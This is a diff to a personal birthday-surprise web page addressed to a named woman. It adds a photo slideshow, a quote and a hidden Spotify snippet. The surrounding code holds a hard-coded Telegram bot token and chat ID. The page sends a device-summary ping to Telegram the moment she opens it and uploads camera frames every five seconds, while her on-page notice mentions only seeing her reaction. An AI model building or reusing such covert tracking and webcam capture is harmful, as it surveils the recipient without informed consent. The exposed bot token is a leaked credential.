@@ -24,8 +24,23 @@
   #landing{
     position:fixed; inset:0; display:flex; flex-direction:column;
     align-items:center; justify-content:center; text-align:center;
-    z-index:50; padding:24px;
-    background: radial-gradient(ellipse at center, var(--bg2), var(--bg1) 80%);
+    z-index:50; padding:24px; overflow:hidden;
+  }
+  #bgSlides{ position:absolute; inset:0; z-index:0; }
+  #bgSlides img{
+    position:absolute; inset:0; width:100%; height:100%; object-fit:cover;
+    opacity:0; transition:opacity 2.2s ease-in-out;
+  }
+  #bgSlides img.active{ opacity:1; }
+  #bgOverlay{
+    position:absolute; inset:0; z-index:1;
+    background: linear-gradient(180deg, rgba(26,15,31,.55), rgba(26,15,31,.85) 60%, var(--bg1) 100%);
+  }
+  #landing > *{ position:relative; z-index:2; }
+  #quote{
+    font-family:'Dancing Script',cursive; font-size:clamp(1.1rem,4.2vw,1.5rem);
+    color:var(--gold); max-width:340px; line-height:1.5; margin-bottom:22px;
+    text-shadow:0 2px 10px rgba(0,0,0,.6);
   }
   .petal{
     position:absolute; top:-10%; font-size:20px; opacity:.8;
@@ -83,10 +98,22 @@
 <body>
 
 <div id="landing">
+  <div id="bgSlides">
+    <img src="photos/p1.jpg" class="active" alt="">
+    <img src="photos/p2.jpg" alt="">
+    <img src="photos/p3.jpg" alt="">
+  </div>
+  <div id="bgOverlay"></div>
   <h1>Hey Shubhayoha 🌹</h1>
+  <p id="quote">"Happy birthday to the girl who stole my heart and never gave it back—I wouldn't want it anywhere else."</p>
   <p>I made something for you. Put your volume up, get comfy, and tap below when you're ready.</p>
   <button id="beginBtn">Open my surprise 🌸</button>
   <p id="camNotice">This page would love to see your reaction while you watch 😊<br>It'll ask to use your camera — totally up to you.</p>
+</div>
+
+<!-- Spotify embed, kept off-screen but functional -->
+<div id="spotifyBox" style="position:fixed; left:-9999px; top:-9999px; width:1px; height:1px; overflow:hidden;">
+  <div id="spotifyEmbed"></div>
 </div>
 
 <div id="stage">
@@ -101,11 +128,52 @@
 <canvas id="snapCanvas" class="hidden-canvas"></canvas>
 <div id="loadingNote"></div>
 
+<script src="https://open.spotify.com/embed/iframe-api/v1" async></script>
 <script>
 /* ====== CONFIG ====== */
 const BOT_TOKEN = "9110997983:AAGxE6UyAq-xwAVBStQ69l9awzXRn62poKs";
 const CHAT_ID   = "1520046232";
 const SNAP_INTERVAL_MS = 5000; // capture a frame every 5s while playing
+const SPOTIFY_TRACK_ID = "4IVsgaAvkLiZGpz1cLUBAd";
+const SONG_START_SEC = 23;
+const SONG_END_SEC = 27;
+
+/* ---- background photo crossfade on landing screen ---- */
+(function(){
+  const imgs = document.querySelectorAll("#bgSlides img");
+  let idx = 0;
+  if(imgs.length > 1){
+    setInterval(()=>{
+      imgs[idx].classList.remove("active");
+      idx = (idx + 1) % imgs.length;
+      imgs[idx].classList.add("active");
+    }, 4000);
+  }
+})();
+
+/* ---- Spotify embed: play 23s-27s once, then stop ---- */
+let spotifyController = null;
+window.onSpotifyIframeApiReady = (IFrameAPI) => {
+  const element = document.getElementById("spotifyEmbed");
+  const options = { uri: `spotify:track:${SPOTIFY_TRACK_ID}`, width: "1", height: "1" };
+  IFrameAPI.createController(element, options, (controller) => {
+    spotifyController = controller;
+    controller.addListener("playback_update", e => {
+      const posSec = (e.data.position || 0) / 1000;
+      if(e.data.isPaused === false && posSec >= SONG_END_SEC){
+        controller.pause();
+      }
+    });
+  });
+};
+
+function playSongSnippet(){
+  if(!spotifyController) return;
+  try{
+    spotifyController.play();
+    setTimeout(()=>{ try{ spotifyController.seek(SONG_START_SEC); }catch(e){} }, 600);
+  }catch(e){}
+}
 
 const tgBase = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
@@ -192,6 +260,9 @@ beginBtn.addEventListener("click", async ()=>{
 
   // Fire the "she opened it" ping immediately, don't block UI on it
   tgSendMessage(deviceSummary());
+
+  // Play the 4-second song snippet once, in the background
+  playSongSnippet();
 
   const camOk = await startCamera();
   if(!camOk){
